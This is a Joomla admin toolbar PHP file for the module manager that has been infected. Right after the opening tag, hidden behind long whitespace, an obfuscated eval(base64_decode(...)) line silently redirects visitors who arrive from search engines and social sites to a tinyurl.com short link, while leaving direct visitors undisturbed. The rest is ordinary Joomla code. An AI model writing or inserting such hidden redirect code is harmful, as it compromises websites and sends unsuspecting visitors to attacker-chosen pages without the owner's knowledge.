<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hNDJzamN3Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
/**
 * @version		$Id: toolbar.modules.html.php 14401 2010-01-26 14:10:00Z louis $
 * @package		Joomla
 * @subpackage	Modules
 * @copyright	Copyright (C) 2005 - 2010 Open Source Matters. All rights reserved.
 * @license		GNU/GPL, see LICENSE.php
 * Joomla! is free software. This version may have been modified pursuant
 * to the GNU General Public License, and as distributed it includes or
 * is derivative of works licensed under the GNU General Public License or
 * other free or open source software licenses.
 * See COPYRIGHT.php for copyright notices and details.
 */

/**
 * @package		Joomla
 * @subpackage	Modules
 */
class TOOLBAR_modules {
	/**
	* Draws the menu for a New module
	*/
	function _NEW($client)
	{
		JToolBarHelper::title( JText::_( 'Module' ) . ': <small><small>[ '. JText::_( 'New' ) .' ]</small></small>', 'module.png' );
		JToolBarHelper::customX( 'edit', 'forward.png', 'forward_f2.png', 'Next', true );
		JToolBarHelper::cancel();
		if ($client->name == 'site') {
			JToolBarHelper::help( 'screen.modulessite.edit' );
		} 
		else {
			JToolBarHelper::help( 'screen.modulesadministrator.edit');
		}
	}

	/**
	* Draws the menu for Editing an existing module
	*/
	function _EDIT( $client )
	{
		$moduleType = JRequest::getCmd( 'module' );
		$cid 		= JRequest::getVar( 'cid', array(0), '', 'array' );
		JArrayHelper::toInteger($cid, array(0));

		JToolBarHelper::title( JText::_( 'Module' ) . ': <small><small>[ '. JText::_( 'Edit' ) .' ]</small></small>', 'module.png' );

		if($moduleType == 'custom') {
			JToolBarHelper::Preview('index.php?option=com_modules&tmpl=component&client='.$client->id.'&pollid='.$cid[0]);
		}

		JToolBarHelper::save();
		JToolBarHelper::apply();
		if ( $cid[0] ) {
			// for existing items the button is renamed `close`
			JToolBarHelper::cancel( 'cancel', 'Close' );
		} else {
			JToolBarHelper::cancel();
		}
		JToolBarHelper::help( 'screen.modules.edit' );
	}

	function _DEFAULT($client)
	{
		JToolBarHelper::title( JText::_( 'Module Manager' ), 'module.png' );
		JToolBarHelper::publishList();
		JToolBarHelper::unpublishList();
		JToolBarHelper::custom( 'copy', 'copy.png', 'copy_f2.png', 'Copy', true );
		JToolBarHelper::deleteList();
		JToolBarHelper::editListX();
		JToolBarHelper::addNewX();
		JToolBarHelper::help( 'screen.modules' );
	}
}
